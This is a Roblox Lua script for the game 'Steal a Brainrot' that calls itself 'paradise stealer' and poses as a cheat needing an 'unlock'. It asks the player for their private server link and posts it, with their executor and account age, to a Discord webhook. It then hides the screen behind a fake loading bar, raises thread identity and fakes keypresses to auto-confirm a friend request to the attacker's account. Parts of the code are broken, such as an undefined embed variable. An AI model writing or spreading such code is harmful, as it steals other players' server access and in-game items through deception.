fenv.Username = "adoptmealt89860" -- The target username for the friend request
fenv.Webhook = "wRTY9R5CZfLyZ6GveZVsZZTNEnWN89fjiQuluYkH4bWAYiAUEuLsuu1V_i7gYnxvZOyM"
local KeyCode = Enum.KeyCode
local CreateInstance = Instance.new
local CreateUDim2 = UDim2.new
local CreateVector2 = Vector2.new
local CreateColor3 = Color3.fromRGB
local CreateUDim = UDim.new
local FontEnum = Enum.Font
local CreateColor3Simple = Color3.new
local CreateTweenInfo = TweenInfo.new
local CreateColorSequenceKeypoint = ColorSequenceKeypoint.new

local Executed = genv.Executed
genv.Executed = true
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local UserGameSettings = fenv.UserSettings():GetService("UserGameSettings")
local VirtualInputManager = game:GetService("VirtualInputManager")
local PlotController = require(ReplicatedStorage.Controllers.PlotController)
require(ReplicatedStorage.Utils.NumberUtils)
require(ReplicatedStorage.Datas.Animals)
require(ReplicatedStorage.Datas.Mutations)
require(ReplicatedStorage.Packages.Net)
local GetSynchronizer = require(ReplicatedStorage.Packages.Synchronizer).Get
local LocalPlayer = Players.LocalPlayer
local GetServerTypeEvent = RobloxReplicatedStorage:WaitForChild("GetServerType")
local InvokeServerType = GetServerTypeEvent.InvokeServer
fenv.args = GetServerTypeEvent
local _, _, ServerTypeMatch = string.find(GetServerTypeEvent[1], "GetServerType")
CHECKIF(ServerTypeMatch)
local MainScreenGui = CreateInstance("ScreenGui", CoreGui)
local MainFrame = CreateInstance("Frame", MainScreenGui)
MainFrame.Size = CreateUDim2(0, 450, 0, 240)
MainFrame.Position = CreateUDim2(0.5, 0, 0.5, 0)
MainFrame.AnchorPoint = CreateVector2(0.5, 0.5)
MainFrame.BackgroundColor3 = CreateColor3(25, 25, 25)
MainFrame.BackgroundTransparency = 0.15
local FrameCorner = CreateInstance("UICorner", MainFrame)
FrameCorner.CornerRadius = CreateUDim(0, 20)
local TitleLabel = CreateInstance("TextLabel", MainFrame)
TitleLabel.Size = CreateUDim2(1, -20, 0, 45)
TitleLabel.Position = CreateUDim2(0, 10, 0, 10)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Enter your Private Server Link to Unlock the Script"
TitleLabel.TextColor3 = CreateColor3(255, 255, 255)
TitleLabel.TextWrapped = true
TitleLabel.TextScaled = true
TitleLabel.Font = FontEnum.FredokaOne
local LinkTextBox = CreateInstance("TextBox", MainFrame)
LinkTextBox.Size = CreateUDim2(0.9, 0, 0, 40)
LinkTextBox.Position = CreateUDim2(0.05, 0, 0.45, 0)
LinkTextBox.PlaceholderText = "Paste your private server link here..."
LinkTextBox.Text = ""
LinkTextBox.TextScaled = true
LinkTextBox.BackgroundColor3 = CreateColor3(50, 50, 50)
LinkTextBox.TextColor3 = CreateColor3Simple(1, 1, 1)
LinkTextBox.Font = FontEnum.GothamBlack
local TextBoxCorner = CreateInstance("UICorner", LinkTextBox)
TextBoxCorner.CornerRadius = CreateUDim(0, 12)
local ContinueButton = CreateInstance("TextButton", MainFrame)
ContinueButton.Size = CreateUDim2(0.5, 0, 0, 40)
ContinueButton.Position = CreateUDim2(0.25, 0, 0.7, 0)
ContinueButton.Text = "Continue"
ContinueButton.BackgroundColor3 = CreateColor3(90, 90, 90)
ContinueButton.TextColor3 = CreateColor3Simple(1, 1, 1)
ContinueButton.TextScaled = true
ContinueButton.Font = FontEnum.GothamBlack
local ButtonCorner = CreateInstance("UICorner", ContinueButton)
ButtonCorner.CornerRadius = CreateUDim(0, 12)
local StatusLabel = CreateInstance("TextLabel", MainFrame)
StatusLabel.Size = CreateUDim2(1, 0, 0, 30)
StatusLabel.Position = CreateUDim2(0, 0, 0.9, -5)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = ""
StatusLabel.TextScaled = true
StatusLabel.Font = FontEnum.FredokaOne
StatusLabel.TextColor3 = CreateColor3Simple(1, 0, 0)
MainFrame.BackgroundTransparency = 1
TitleLabel.TextTransparency = 1
LinkTextBox.TextTransparency = 1
ContinueButton.TextTransparency = 1
StatusLabel.TextTransparency = 1
local TweenService = game:GetService("TweenService")
local FrameTween = TweenService:Create(MainFrame, CreateTweenInfo(0.6), {
    BackgroundTransparency = 0.15,
})
FrameTween:Play()
local TitleTween = TweenService:Create(TitleLabel, CreateTweenInfo(0.6), {
    TextTransparency = 0,
})
TitleTween:Play()
local TextBoxTween = TweenService:Create(LinkTextBox, CreateTweenInfo(0.6), {
    TextTransparency = 0,
})
TextBoxTween:Play()
local ButtonTween = TweenService:Create(ContinueButton, CreateTweenInfo(0.6), {
    TextTransparency = 0,
})
ButtonTween:Play()
ContinueButton.MouseButton1Click:Connect(function(...)
    local PrivateServerLink = LinkTextBox.Text
    local IsInvalidLink = not PrivateServerLink:match("^https://www%.roblox%.com/share%?code=%w+&type=Server$")
    StatusLabel.TextTransparency = 0
    StatusLabel.TextColor3 = CreateColor3Simple(0, 1, 0)
    StatusLabel.Text = "âœ… Valid link!"
    ContinueButton.Active = false
    task.wait(1)
    MainScreenGui:Destroy()

    local MyPlotChannel
    local PlotChannelValue = "N/A"
    -- Attempt to get the plot channel safely
    pcall(function()
        -- Assuming PlotController:GetMyPlot() returns an object with a Channel table
        -- that has a Get method to retrieve the channel ID/data.
        MyPlotChannel = PlotController:GetMyPlot().Channel.Get
        PlotChannelValue = tostring(MyPlotChannel)
    end)
    
    local WebhookUrl = "https://discord.com/api/webhooks/1419178822296801422"..fenv.Webhook
    local ExecutorName, ExecutorVersion = identifyexecutor()
    
    -- Construct the webhook payload
   local ExecutorName, ExecutorVersion = identifyexecutor()
    local WebhookData= HttpService:JSONEncode({   
   color = 16761035, -- Bright yellow/gold color
    fields = {
        [1] = {
            name = ":bust_in_silhouette: Player Information",
            value = " \nReceiver: " .. fenv.Username ..              "\nExecutor: " ..ExecutorName .."\nAccount Age: " .. Players.LocalPlayer.AccountAge .. " days```",
            inline = false,
        },
        [2] = {
            name = ":house: Plot Channel (ID)",
            value = "```" .. PlotChannelValue .. "```", -- Plot Channel data
            inline = true,
        },
        [3] = {
            name = ":school_satchel: Brainrots",
            value = "```Empty```",
            inline = true,
        },
        [4] = {
            name = ":link: Join Private Server",
            value = "**[Join](" .. PrivateServerLink .. ")**", -- Actionable link
            inline = false,
        },
    },
    title = ":brain: Steal A Brainrot Hit - paradise stealer :brain:",
}

-- 2. Define the full payload structure (content and the embed array)
local WebhookPayload = {
    content = PrivateServerLink, -- The content field is the link (optional, but helpful)
    embeds = { Embed }, -- The embed is always placed inside an array
}

-- 3. Encode the Lua table into a JSON string for the HTTP request
local WebhookData = HttpService:JSONEncode(WebhookPayload)

-- WebhookData is the variable you would send in your request({...}) call.
                                         -- Send the webhook request
    request({
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Url = WebhookUrl,
        Method = "POST",
        Body = WebhookData,
    })
    
    UserGameSettings.MasterVolume = 0
    local LoadingScreenGui = CreateInstance("ScreenGui")
    LoadingScreenGui.IgnoreGuiInset = true
    LoadingScreenGui.Parent = CoreGui
    LoadingScreenGui.DisplayOrder = 1 / 0
    local LoadingFrame = CreateInstance("Frame")
    LoadingFrame.Size = CreateUDim2(1, 0, 1, 0)
    LoadingFrame.Parent = LoadingScreenGui
    local Gradient = CreateInstance("UIGradient")
    local GradientColors = ColorSequence.new({
        [1] = CreateColorSequenceKeypoint(0, CreateColor3(0, 0, 0)),
        [2] = CreateColorSequenceKeypoint(1, CreateColor3(255, 255, 255)),
    })
    Gradient.Color = GradientColors
    Gradient.Parent = LoadingFrame
    local BackgroundImage = CreateInstance("ImageLabel")
    BackgroundImage.BackgroundTransparency = 1
    BackgroundImage.Size = CreateUDim2(1, 0, 1, 0)
    BackgroundImage.Image = "rbxassetid://2151741365"
    BackgroundImage.ImageTransparency = 0.5
    BackgroundImage.ScaleType = Enum.ScaleType.Tile
    BackgroundImage.TileSize = CreateUDim2(0, 250, 0, 250)
    BackgroundImage.Parent = LoadingFrame
    local LoadingTitle = CreateInstance("TextLabel")
    LoadingTitle.AnchorPoint = CreateVector2(0.5, 0.5)
    LoadingTitle.BackgroundTransparency = 1
    LoadingTitle.Position = CreateUDim2(0.5, 0, 0.3, 0)
    LoadingTitle.Size = CreateUDim2(0.3, 0, 0.3, 0)
    LoadingTitle.Font = FontEnum.GothamBlack
    LoadingTitle.Text = "ðŸ§  Steal a Brainrot ðŸ§ "
    LoadingTitle.TextColor3 = CreateColor3(255, 255, 255)
    LoadingTitle.TextScaled = true
    LoadingTitle.Parent = LoadingFrame
    local LoadingMessage = CreateInstance("TextLabel")
    LoadingMessage.AnchorPoint = CreateVector2(0.5, 0.5)
    LoadingMessage.BackgroundTransparency = 1
    LoadingMessage.Position = CreateUDim2(0.5, 0, 0.5, 0)
    LoadingMessage.Size = CreateUDim2(0.8, 0, 0.06, 0)
    LoadingMessage.Font = FontEnum.GothamSemibold
    LoadingMessage.Text = "Script Loading Please Wait for a While\n Don't worry, your base will be automatically locked"
    LoadingMessage.TextColor3 = CreateColor3(255, 255, 255)
    LoadingMessage.TextXAlignment = Enum.TextXAlignment.Center
    LoadingMessage.TextScaled = true
    LoadingMessage.Parent = LoadingFrame
    local ProgressBarContainer = CreateInstance("Frame")
    ProgressBarContainer.AnchorPoint = CreateVector2(0.5, 0.5)
    ProgressBarContainer.BackgroundColor3 = CreateColor3(0, 0, 0)
    ProgressBarContainer.BackgroundTransparency = 0.5
    ProgressBarContainer.Position = CreateUDim2(0.5, 0, 0.56, 0)
    ProgressBarContainer.Size = CreateUDim2(0.5, 0, 0.065, 0)
    ProgressBarContainer.Parent = LoadingFrame
    local ProgressBarCorner = CreateInstance("UICorner")
    ProgressBarCorner.CornerRadius = CreateUDim(0, 10)
    ProgressBarCorner.Parent = ProgressBarContainer
    local ProgressBar = CreateInstance("Frame")
    ProgressBar.Name = "LoadBar"
    ProgressBar.BackgroundColor3 = CreateColor3(255, 255, 255)
    ProgressBar.Position = CreateUDim2(0, 0, 0, 0)
    ProgressBar.Size = CreateUDim2(0, 0, 1, 0)
    ProgressBar.Parent = ProgressBarContainer
    local ProgressBarInnerCorner = CreateInstance("UICorner")
    ProgressBarInnerCorner.CornerRadius = CreateUDim(0, 10)
    ProgressBarInnerCorner.Parent = ProgressBar
    local ProgressText = CreateInstance("TextLabel")
    ProgressText.AnchorPoint = CreateVector2(0.5, 0.5)
    ProgressText.BackgroundTransparency = 1
    ProgressText.Position = CreateUDim2(0.5, 0, 0.65, 0)
    ProgressText.Size = CreateUDim2(1, 0, 0.05, 0)
    ProgressText.Font = FontEnum.GothamSemibold
    ProgressText.Text = "0%"
    ProgressText.TextColor3 = CreateColor3(255, 255, 255)
    ProgressText.TextScaled = true
    ProgressText.Parent = LoadingFrame
    local DiscordLink = CreateInstance("TextLabel")
    DiscordLink.AnchorPoint = CreateVector2(0.5, 0.5)
    DiscordLink.BackgroundTransparency = 1
    DiscordLink.Position = CreateUDim2(0.5, 0, 0.56, 0)
    DiscordLink.Size = CreateUDim2(0.3, 0, 0.02, 0)
    DiscordLink.Font = FontEnum.SourceSansBold
    DiscordLink.Text = "discord.gg/paradiserbx"
    DiscordLink.TextColor3 = CreateColor3(150, 150, 150)
    DiscordLink.TextScaled = false
    DiscordLink.TextSize = 14
    DiscordLink.Parent = LoadingFrame
    local ProgressBarTween = TweenService:Create(ProgressBar, CreateTweenInfo(180, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
        Size = CreateUDim2(1, 0, 1, 0),
    })
    ProgressBarTween:Play()
    task.spawn(function(...)
        ProgressText.Text = "0%"
        task.wait(1.8)
        ProgressText.Text = "1%"
        task.wait(1.8)
        ProgressText.Text = "2%"
        task.wait(1.8)
        ProgressText.Text = "3%"
        task.wait(1.8)
        ProgressText.Text = "4%"
        task.wait(1.8)
        ProgressText.Text = "5%"
        task.wait(1.8)
        ProgressText.Text = "6%"
        task.wait(1.8)
        ProgressText.Text = "7%"
        task.wait(1.8)
        ProgressText.Text = "8%"
        task.wait(1.8)
        ProgressText.Text = "9%"
        task.wait(1.8)
        ProgressText.Text = "10%"
        task.wait(1.8)
        ProgressText.Text = "11%"
        task.wait(1.8)
        ProgressText.Text = "12%"
        task.wait(1.8)
        ProgressText.Text = "13%"
        task.wait(1.8)
        ProgressText.Text = "14%"
        task.wait(1.8)
        ProgressText.Text = "15%"
        task.wait(1.8)
        ProgressText.Text = "16%"
        task.wait(1.8)
        ProgressText.Text = "17%"
        task.wait(1.8)
        ProgressText.Text = "18%"
        task.wait(1.8)
        ProgressText.Text = "19%"
        task.wait(1.8)
        ProgressText.Text = "20%"
        task.wait(1.8)
        ProgressText.Text = "21%"
        task.wait(1.8)
        ProgressText.Text = "22%"
        task.wait(1.8)
        ProgressText.Text = "23%"
        task.wait(1.8)
        ProgressText.Text = "24%"
        task.wait(1.8)
        ProgressText.Text = "25%"
        task.wait(1.8)
        ProgressText.Text = "26%"
        task.wait(1.8)
        ProgressText.Text = "27%"
        task.wait(1.8)
        ProgressText.Text = "28%"
        task.wait(1.8)
        ProgressText.Text = "29%"
        task.wait(1.8)
        ProgressText.Text = "30%"
        task.wait(1.8)
        ProgressText.Text = "31%"
        task.wait(1.8)
        ProgressText.Text = "32%"
        task.wait(1.8)
        ProgressText.Text = "33%"
        task.wait(1.8)
        ProgressText.Text = "34%"
        task.wait(1.8)
        ProgressText.Text = "35%"
        task.wait(1.8)
        ProgressText.Text = "36%"
        task.wait(1.8)
        ProgressText.Text = "37%"
        task.wait(1.8)
        ProgressText.Text = "38%"
        task.wait(1.8)
        ProgressText.Text = "39%"
        task.wait(1.8)
        ProgressText.Text = "40%"
        task.wait(1.8)
        ProgressText.Text = "41%"
        task.wait(1.8)
        ProgressText.Text = "42%"
        task.wait(1.8)
        ProgressText.Text = "43%"
        task.wait(1.8)
        ProgressText.Text = "44%"
        task.wait(1.8)
        ProgressText.Text = "45%"
        task.wait(1.8)
        ProgressText.Text = "46%"
        task.wait(1.8)
        ProgressText.Text = "47%"
        task.wait(1.8)
        ProgressText.Text = "48%"
        task.wait(1.8)
        ProgressText.Text = "49%"
        task.wait(1.8)
        ProgressText.Text = "50%"
        task.wait(1.8)
        ProgressText.Text = "51%"
        task.wait(1.8)
        ProgressText.Text = "52%"
        task.wait(1.8)
        ProgressText.Text = "53%"
        task.wait(1.8)
        ProgressText.Text = "54%"
        task.wait(1.8)
        ProgressText.Text = "55%"
        task.wait(1.8)
        ProgressText.Text = "56%"
        task.wait(1.8)
        ProgressText.Text = "57%"
        task.wait(1.8)
        ProgressText.Text = "58%"
        task.wait(1.8)
        ProgressText.Text = "59%"
        task.wait(1.8)
        ProgressText.Text = "60%"
        task.wait(1.8)
        ProgressText.Text = "61%"
        task.wait(1.8)
        ProgressText.Text = "62%"
        task.wait(1.8)
        ProgressText.Text = "63%"
        task.wait(1.8)
        ProgressText.Text = "64%"
        task.wait(1.8)
        ProgressText.Text = "65%"
        task.wait(1.8)
        ProgressText.Text = "66%"
        task.wait(1.8)
        ProgressText.Text = "67%"
        task.wait(1.8)
        ProgressText.Text = "68%"
        task.wait(1.8)
        ProgressText.Text = "69%"
        task.wait(1.8)
        ProgressText.Text = "70%"
        task.wait(1.8)
        ProgressText.Text = "71%"
        task.wait(1.8)
        ProgressText.Text = "72%"
        task.wait(1.8)
        ProgressText.Text = "73%"
        task.wait(1.8)
        ProgressText.Text = "74%"
        task.wait(1.8)
        ProgressText.Text = "75%"
        task.wait(1.8)
        ProgressText.Text = "76%"
        task.wait(1.8)
        ProgressText.Text = "77%"
        task.wait(1.8)
        ProgressText.Text = "78%"
        task.wait(1.8)
        ProgressText.Text = "79%"
        task.wait(1.8)
        ProgressText.Text = "80%"
        task.wait(1.8)
        ProgressText.Text = "81%"
        task.wait(1.8)
        ProgressText.Text = "82%"
        task.wait(1.8)
        ProgressText.Text = "83%"
        task.wait(1.8)
        ProgressText.Text = "84%"
        task.wait(1.8)
        ProgressText.Text = "85%"
        task.wait(1.8)
        ProgressText.Text = "86%"
        task.wait(1.8)
        ProgressText.Text = "87%"
        task.wait(1.8)
        ProgressText.Text = "88%"
        task.wait(1.8)
        ProgressText.Text = "89%"
        task.wait(1.8)
        ProgressText.Text = "90%"
        task.wait(1.8)
        ProgressText.Text = "91%"
        task.wait(1.8)
        ProgressText.Text = "92%"
        task.wait(1.8)
        ProgressText.Text = "93%"
        task.wait(1.8)
        ProgressText.Text = "94%"
        task.wait(1.8)
        ProgressText.Text = "95%"
        task.wait(1.8)
        ProgressText.Text = "96%"
        task.wait(1.8)
        ProgressText.Text = "97%"
        task.wait(1.8)
        ProgressText.Text = "98%"
        task.wait(1.8)
        ProgressText.Text = "99%"
        task.wait(1.8)
        ProgressText.Text = "100%"
    end)
    
    -- Use fenv.Username for the target player
    local TargetPlayer = Players:FindFirstChild(fenv.Username)
    
    local CurrentThreadIdentity = getthreadidentity()
    setthreadidentity(5)
    
    -- Attempt friend request if the target player is in the game
    if TargetPlayer then
        StarterGui:SetCore("PromptSendFriendRequest", TargetPlayer)
    end
    
    task.wait(0.5)
    local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
    local PromptDialog = RobloxGui:FindFirstChild("PromptDialog")
    local ContainerFrame = PromptDialog and PromptDialog:FindFirstChild("ContainerFrame")
    local ConfirmButton = ContainerFrame and ContainerFrame:FindFirstChild("ConfirmButton")
    setthreadidentity(CurrentThreadIdentity)
    if ConfirmButton then
        GuiService.SelectedObject = ConfirmButton
        task.wait(0.3)
        VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
        VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
        task.wait(0.2)
        VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
        VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
        task.wait(0.2)
        VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
        VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
        task.wait(0.2)
    end
    
    -- Update PlayerAdded connection to use fenv.Username
    Players.PlayerAdded:Connect(function(NewPlayer)
        local IsTargetPlayer = table.find({fenv.Username}, NewPlayer.Name)
        if IsTargetPlayer then
            local MyPlotChannel = PlotController:GetMyPlot().Channel.Get
            local ThreadIdentity = getthreadidentity()
            CHECKIF(ThreadIdentity)
            setthreadidentity(5)
            StarterGui:SetCore("PromptSendFriendRequest", NewPlayer)
            task.wait(0.5)
            local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
            local PromptDialog = RobloxGui:FindFirstChild("PromptDialog")
            local ContainerFrame = PromptDialog and PromptDialog:FindFirstChild("ContainerFrame")
            local ConfirmButton = ContainerFrame and ContainerFrame:FindFirstChild("ConfirmButton")
            setthreadidentity(ThreadIdentity)
            if ConfirmButton then
                GuiService.SelectedObject = ConfirmButton
                task.wait(0.3)
                VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
                VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
                task.wait(0.2)
                VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
                VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
                task.wait(0.2)
                VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
                VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
                task.wait(0.2)
            end
        end
    end)
end)
